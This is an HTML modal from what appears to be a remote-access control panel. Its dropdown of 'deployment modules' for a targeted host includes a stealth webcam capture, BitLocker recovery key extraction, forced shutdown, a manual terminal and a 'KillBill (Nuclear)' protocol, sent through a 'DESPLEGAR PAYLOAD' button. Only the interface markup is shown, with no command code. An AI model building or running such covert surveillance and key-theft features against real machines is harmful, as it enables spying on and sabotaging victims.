<div class="modal fade" id="manageModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content border-0 shadow-lg" style="background-color: #f8f9fa;">
            <div class="modal-header bg-dark text-white border-0">
                <h5 class="modal-title fw-bold">Console: <span id="modalHostName" class="text-danger"></span></h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body p-4">
                <form id="commandForm" onsubmit="event.preventDefault(); enviarComandoAjax();">
                    <input type="hidden" id="modalEndpointId">
                    
                    <div id="caja-gestionar" class="mb-4">
                        <label class="form-label small fw-bold text-muted">SELECCIONAR MÓDULO DE DESPLIEGUE</label>
                        <select class="form-select border-2" id="commandTypeSelect" onchange="updateCommandString()" style="border-left: 4px solid #E31D2B;">
                            <option value="test">System Health Check (Calc)</option>
                            <option value="lock">Bloquear Estación (Workstation Lock)</option>
                            <option value="shutdown">Apagado Forzado (Force Shutdown)</option>
                            <option value="custom">Terminal Avanzada (Manual Input)</option>
                            <option value="take_photo" style="color:#bd93f9; font-weight:bold;">[CAM] Stealth Webcam Shot</option>
                            <option value="bitlocker" style="color:#17a2b8; font-weight:bold;">[SEC] Recovery Key Extraction</option>
                            <option value="killbill" style="color:#E31D2B; font-weight:bold;">[CRIT] Protocolo KillBill (Nuclear)</option>
                        </select>
                    </div>

                    <div class="terminal-window shadow-lg">
                        <div class="terminal-header">
                            <div class="terminal-tab">bash - secure_session</div>
                        </div>
                        <div class="terminal-body" id="contenedor-pantalla-negra">
                            </div>
                    </div>
                </form>
            </div>
            <div class="modal-footer bg-white border-0 p-4" id="caja-footer-gestionar">
                <button type="button" class="btn btn-secondary px-4" data-bs-dismiss="modal">Cerrar</button>
                <button type="button" class="btn btn-danger px-5 fw-bold" onclick="enviarComandoAjax()">DESPLEGAR PAYLOAD</button>
            </div>
        </div>
    </div>
</div>